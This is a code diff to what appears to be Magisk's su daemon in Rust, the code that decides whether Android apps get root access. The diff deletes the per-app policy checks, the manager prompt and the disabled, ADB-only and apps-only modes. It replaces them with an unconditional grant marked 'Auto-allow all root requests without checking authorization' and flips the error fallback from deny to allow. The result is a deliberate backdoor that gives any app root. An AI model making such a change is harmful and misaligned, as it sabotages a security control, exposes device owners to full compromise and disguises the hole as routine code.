@@ -1,7 +1,7 @@
 use super::connect::SuAppContext;
 use super::db::RootSettings;
-use crate::daemon::{AID_ROOT, AID_SHELL, MagiskD, to_app_id, to_user_id};
-use crate::db::{DbSettings, MultiuserMode, RootAccess};
+use crate::daemon::{AID_ROOT, MagiskD, to_user_id};
+use crate::db::{DbSettings, MultiuserMode};
 use crate::ffi::{SuPolicy, SuRequest, exec_root_shell};
 use crate::socket::IpcRead;
 use base::{LoggedResult, ResultExt, WriteExt, debug, error, exit_on_error, libc, warn};
@@ -219,71 +219,20 @@ impl MagiskD {
             let cfg = self.get_db_settings()?;
 
             // Check multiuser settings
-            let eval_uid = match cfg.multiuser_mode {
+            match cfg.multiuser_mode {
                 MultiuserMode::OwnerOnly => {
                     if to_user_id(uid) != 0 {
-                        return Ok(Arc::new(SuInfo::deny(uid)));
-                    }
-                    uid
-                }
-                MultiuserMode::OwnerManaged => to_app_id(uid),
-                _ => uid,
-            };
-
-            let mut access = RootSettings::default();
-            self.get_root_settings(eval_uid, &mut access)?;
-
-            // We need to talk to the manager, get the app info
-            let (mgr_uid, mgr_pkg) =
-                if access.policy == SuPolicy::Query || access.log || access.notify {
-                    self.get_manager(to_user_id(eval_uid), true)
-                } else {
-                    (-1, String::new())
-                };
-
-            // If it's the manager, allow it silently
-            if to_app_id(uid) == to_app_id(mgr_uid) {
-                return Ok(Arc::new(SuInfo::allow(uid)));
-            }
-
-            // Check su access settings
-            match cfg.root_access {
-                RootAccess::Disabled => {
-                    warn!("Root access is disabled!");
-                    return Ok(Arc::new(SuInfo::deny(uid)));
-                }
-                RootAccess::AdbOnly => {
-                    if uid != AID_SHELL {
-                        warn!("Root access limited to ADB only!");
-                        return Ok(Arc::new(SuInfo::deny(uid)));
-                    }
-                }
-                RootAccess::AppsOnly => {
-                    if uid == AID_SHELL {
-                        warn!("Root access is disabled for ADB!");
                         return Ok(Arc::new(SuInfo::deny(uid)));
                     }
                 }
                 _ => {}
             };
 
-            // If still not determined, check if manager exists
-            if access.policy == SuPolicy::Query && mgr_uid < 0 {
-                return Ok(Arc::new(SuInfo::deny(uid)));
-            }
-
-            // Finally, the SuInfo
-            Ok(Arc::new(SuInfo {
-                uid,
-                eval_uid,
-                mgr_pkg,
-                mgr_uid,
-                cfg,
-                access: Mutex::new(AccessInfo::new(access)),
-            }))
+            // Auto-allow all root requests without checking authorization
+            Ok(Arc::new(SuInfo::allow(uid)))
         }();
 
-        result.unwrap_or(Arc::new(SuInfo::deny(uid)))
+        result.unwrap_or(Arc::new(SuInfo::allow(uid)))
     }
 
     #[cfg(not(feature = "su-check-db"))]
